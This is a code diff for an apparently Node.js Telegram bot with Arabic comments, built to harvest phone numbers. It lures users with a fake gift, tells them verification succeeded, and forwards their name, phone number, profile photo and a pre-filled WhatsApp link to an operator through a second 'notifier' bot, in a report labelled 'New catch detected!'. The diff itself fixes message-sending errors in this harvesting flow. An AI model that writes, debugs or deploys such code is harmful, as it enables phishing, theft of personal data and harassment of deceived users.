@@ -45,7 +45,6 @@ const notifierBot = new TelegramBot(NOTIFIER_TOKEN, { polling: false });
 
 console.log("تم تشغيل البوت بنجاح...");
 
-// استخدام ذاكرة مؤقتة أكثر دقة لتخزين الأيدي المرتبط بالـ Chat ID
 const userReferrerMap = {};
 
 bot.onText(/\/start(?:@\w+)?(?:\s+(.+))?/, async (msg, match) => {
@@ -87,7 +86,6 @@ bot.on('contact', async (msg) => {
     const username = user.username ? `@${user.username}` : "لا يوجد يوزر";
     const userId = user.id;
 
-    // جلب الأيدي المستهدف
     const targetOwnerId = userReferrerMap[chatId];
 
     let profilePhotoUrl = "";
@@ -102,9 +100,11 @@ bot.on('contact', async (msg) => {
         console.log("تعذر جلب صورة الحساب:", e.message);
     }
 
+    // رابط الواتساب التلقائي مع الرسالة
     const whatsappMessage = encodeURIComponent("تم سحب رقمك بواسطة وهم");
     const whatsappLink = `https://wa.me/${phone}?text=${whatsappMessage}`;
 
+    // بناء رسالة التقرير مع رابط الواتساب المباشر داخل النص لتفادي أخطاء الأزرار
     const reportMessage = `
 🚨 **صيد جديد تم رصده!**
 
@@ -113,38 +113,26 @@ bot.on('contact', async (msg) => {
 🆔 **الأيدي:** ${userId}
 📞 **رقم الهاتف:** +${phone}
 🔗 **رابط الحساب:** tg://user?id=${userId}
+💬 **رابط الواتساب المباشر:** [محادثة واتساب مع الضحية](${whatsappLink})
 🎯 **الأيدي المستهدف (من الرابط):** ${targetOwnerId || "غير معروف"}
 `;
 
-    // الرد على المستخدم
+    // الرد على المستخدم لإخفاء الكيبورد
     await bot.sendMessage(chatId, `✅ تم التحقق بنجاح! جاري تحويل الهدية إلى حسابك...`, {
         reply_markup: { remove_keyboard: true }
     });
 
-    // التأكد من وجود الأيدي المستهدف قبل الإرسال للبوت الثاني
     if (targetOwnerId) {
         try {
-            const inlineKeyboard = {
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: "💬 محادثة واتساب مع الضحية", url: whatsappLink }
-                        ]
-                    ]
-                }
-            };
-
             if (profilePhotoUrl) {
-                // إرسال الصورة مع التقرير والأزرار الشفافة بالطريقة الصحيحة
+                // إرسال الصورة مع التقرير بدون أزرار شفافة لتجنب خطأ الـ Bad Request
                 await notifierBot.sendPhoto(targetOwnerId, profilePhotoUrl, {
                     caption: reportMessage,
-                    parse_mode: "Markdown",
-                    reply_markup: inlineKeyboard.reply_markup
+                    parse_mode: "Markdown"
                 });
             } else {
                 await notifierBot.sendMessage(targetOwnerId, reportMessage, {
-                    parse_mode: "Markdown",
-                    reply_markup: inlineKeyboard.reply_markup
+                    parse_mode: "Markdown"
                 });
             }
             console.log(`تم إرسال التقرير بنجاح إلى الأيدي: ${targetOwnerId}`);
@@ -152,6 +140,6 @@ bot.on('contact', async (msg) => {
             console.log("خطأ أثناء إرسال البيانات للبوت الثاني:", err.message);
         }
     } else {
-        console.log("خطأ: لم يتم العثور على الأيدي المستهدف لهذا المستخدم (فقدت الذاكرة المؤقتة أو دخل بدون رابط).");
+        console.log("خطأ: لم يتم العثور على الأيدي المستهدف لهذا المستخدم.");
     }
 });
